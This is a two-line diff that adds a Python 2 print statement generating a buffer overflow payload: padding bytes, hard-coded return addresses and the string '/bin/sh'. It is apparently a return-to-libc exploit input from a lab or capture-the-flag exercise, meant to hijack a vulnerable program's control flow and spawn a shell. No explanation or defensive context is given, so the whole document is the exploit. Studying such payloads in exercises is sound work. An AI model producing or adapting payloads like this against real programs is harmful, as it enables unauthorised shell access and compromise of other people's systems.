@@ -1,0 +1,2 @@
+
+print "A"*22+"\x30\xa0\x04\x08"+"a"*4+"\x78\xbf\xfe\xbf"+"/bin/sh"
